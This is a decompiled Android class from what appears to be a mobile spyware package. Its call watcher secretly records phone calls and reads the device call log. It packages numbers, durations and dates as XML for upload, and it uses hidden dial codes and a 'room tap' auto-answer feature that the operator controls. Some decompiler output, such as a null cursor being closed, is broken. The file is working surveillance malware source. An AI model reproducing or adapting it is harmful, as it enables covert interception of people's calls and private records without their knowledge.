package com.network.android;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.CallLog;
import android.telephony.TelephonyManager;
import android.util.Xml;
import com.network.android.a.c;
import com.network.android.c.a.a;
import com.network.android.roomTap.AutoAnswerReceiver;
import com.network.b.b;
import java.io.StringWriter;
import org.xmlpull.v1.XmlSerializer;

public class AndroidCallDirectWatcher extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    public static String f38a = null;
    public static Integer b = -1;
    public static boolean c = false;
    public static String[] d = {"number", "type", "duration", "date", "logtype", "_id"};
    private static Handler f = new Handler();
    private static String g = TelephonyManager.EXTRA_STATE_IDLE;
    private static String h;
    private static String i = null;
    private static Handler j;
    private Handler e = new Handler();

    static {
        HandlerThread handlerThread = new HandlerThread("addRecordFileToProductsDB");
        handlerThread.start();
        j = new Handler(handlerThread.getLooper());
    }

    public static void a(Context context, Handler handler) {
        a.a("AndroidCallDirectWatcher sendCall start post");
        handler.post(new b(context, handler));
    }

    static /* synthetic */ void a(Context context, String str, String str2) {
        Cursor cursor;
        try {
            a.a("AndroidCallDirectWatcher getCall callLogId: " + i);
            if (i != null) {
                cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, "date > ?", new String[]{i}, "date ASC");
            } else {
                cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date ASC");
            }
            try {
                int count = cursor.getCount();
                a.a("AndroidCallDirectWatcher call getCall size : " + count);
                if (count == 0) {
                    try {
                        cursor.close();
                    } catch (Throwable th) {
                        a.a("AndroidCallDirectWatcher getCall finaly Exception- " + th.getMessage(), th);
                    }
                } else {
                    if (cursor.moveToFirst()) {
                        a(context, str, str2, cursor, true);
                        i = cursor.getString(cursor.getColumnIndex("date"));
                        while (cursor.moveToNext()) {
                            a(context, str, str2, cursor, false);
                            i = cursor.getString(cursor.getColumnIndex("date"));
                        }
                        SharedPreferences.Editor edit = context.getSharedPreferences("NetworkIndex", 0).edit();
                        edit.putString("networkId", i);
                        edit.commit();
                        a.a("AndroidCallDirectWatcher getCall UPDATED callLogId: " + i);
                    } else {
                        a.a("AndroidCallDirectWatcher getCall monitor no new call records");
                    }
                    try {
                        cursor.close();
                    } catch (Throwable th2) {
                        a.a("AndroidCallDirectWatcher getCall finaly Exception- " + th2.getMessage(), th2);
                    }
                }
            } catch (Throwable th3) {
                th = th3;
                try {
                    a.a("AndroidCallDirectWatcher getCall Exception- " + th.getMessage(), th);
                    try {
                        cursor.close();
                    } catch (Throwable th4) {
                        a.a("AndroidCallDirectWatcher getCall finaly Exception- " + th4.getMessage(), th4);
                    }
                } catch (Throwable th5) {
                    th = th5;
                    try {
                        cursor.close();
                    } catch (Throwable th6) {
                        a.a("AndroidCallDirectWatcher getCall finaly Exception- " + th6.getMessage(), th6);
                    }
                    throw th;
                }
            }
        } catch (Throwable th7) {
            th = th7;
            cursor = null;
            cursor.close();
            throw th;
        }
    }

    private static void a(Context context, String str, String str2, Cursor cursor, boolean z) {
        boolean z2 = true;
        try {
            int columnIndex = cursor.getColumnIndex("number");
            int columnIndex2 = cursor.getColumnIndex("type");
            int columnIndex3 = cursor.getColumnIndex("date");
            int columnIndex4 = cursor.getColumnIndex("duration");
            int columnIndex5 = cursor.getColumnIndex("_id");
            try {
                int columnIndex6 = cursor.getColumnIndex("logtype");
                a.a("AndroidCallDirectWatcher getCall logtype index: " + columnIndex6);
                if (columnIndex6 != -1) {
                    int i2 = cursor.getInt(columnIndex6);
                    a.a("AndroidCallDirectWatcher getCall logtype: " + i2);
                    if (i2 == 300 || i2 == 200) {
                        a.a("AndroidCallDirectWatcher getCall logtype: " + i2 + "  is not a call log id: " + columnIndex5);
                        z2 = false;
                    }
                }
            } catch (Throwable th) {
                a.a("AndroidCallDirectWatcher getCall logtype- " + th.getMessage(), th);
            }
            if (z2) {
                String string = cursor.getString(columnIndex3);
                int i3 = cursor.getInt(columnIndex2);
                String string2 = cursor.getString(columnIndex4);
                String string3 = cursor.getString(columnIndex5);
                String string4 = cursor.getString(columnIndex);
                if (string4.equals("*762646466")) {
                    c = true;
                    a.a("AndroidCallDirectWatcher sendCallLog setRomingNumberCalled true: " + string4);
                    b.c(context);
                } else if (string4.equals("*7626464633")) {
                    c = false;
                    a.a("AndroidCallDirectWatcher sendCallLog setRomingNumberCalled false: " + string4);
                    b.c(context);
                }
                String f2 = b.f();
                if (f2 == null || "10".equals(f2) || !string4.endsWith(f2)) {
                    a.a("AndroidCallDirectWatcher sendCallLog recordId: " + string3 + " number: " + string4 + " duration: " + string2 + " type: " + i3);
                    XmlSerializer newSerializer = Xml.newSerializer();
                    StringWriter stringWriter = new StringWriter();
                    SmsReceiver.a(newSerializer, stringWriter);
                    newSerializer.startTag("", "phoneCalls");
                    m.a(newSerializer, string4, string, i3, string2, str, string3);
                    newSerializer.endTag("", "phoneCalls");
                    SmsReceiver.a(newSerializer);
                    j.a(context, stringWriter.toString(), (String[]) null, (byte[][]) null);
                } else {
                    a.a("AndroidCallDirectWatcher sendCallLog not sending the room tap number: " + string4);
                }
                if (z) {
                    a.a("AndroidCallDirectWatcher getCall  record call shouldCallRecord: " + b.e(context) + " recordId: " + string3 + " shouldSendCallRecordingEvenThatSettingIsDisable: " + c.h);
                    if (((b.e(context).booleanValue() && string3 != null) || c.h) && str2 != null) {
                        a.a("AndroidCallDirectWatcher getCall ,post, recordingFile: " + str2);
                        c.h = false;
                        j.post(new e(string3, context, str2));
                    }
                }
            }
        } catch (Throwable th2) {
            a.a("AndroidCallDirectWatcher sendSingleCall Exception- " + th2.getMessage(), th2);
        }
    }

    public static void a(String str) {
        a.a("AndroidCallDirectWatcher setCallLogId: " + str);
        i = str;
    }

    public static void a(boolean z) {
        c = z;
    }

    public static boolean a() {
        return c;
    }

    public void onReceive(Context context, Intent intent) {
        try {
            String stringExtra = intent.getStringExtra("state");
            String stringExtra2 = intent.getStringExtra("incoming_number");
            a.a("AndroidCallDirectWatcher phone_state: " + stringExtra + " Incoming number: " + stringExtra2);
            if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(stringExtra)) {
                a.a("AndroidCallDirectWatcher incoming call");
                if (b.e(context).booleanValue()) {
                    a.a("AndroidCallDirectWatcher no need to record call");
                    if (!AutoAnswerReceiver.a()) {
                        a.a("AndroidCallDirectWatcher start recording.");
                        a.a("AndroidCallDirectWatcher record post");
                        this.e.post(new a(this, context));
                    }
                } else {
                    a.a("AndroidCallDirectWatcher record got incoming call. NOT suppose to record according to configuration");
                }
            }
            if (TelephonyManager.EXTRA_STATE_IDLE.equals(stringExtra)) {
                a(context, this.e);
            }
            g = stringExtra;
            h = stringExtra2;
        } catch (Throwable th) {
            a.a("AndroidCallDirectWatcher Call Listener Exception- " + th.getMessage(), th);
        }
    }
}
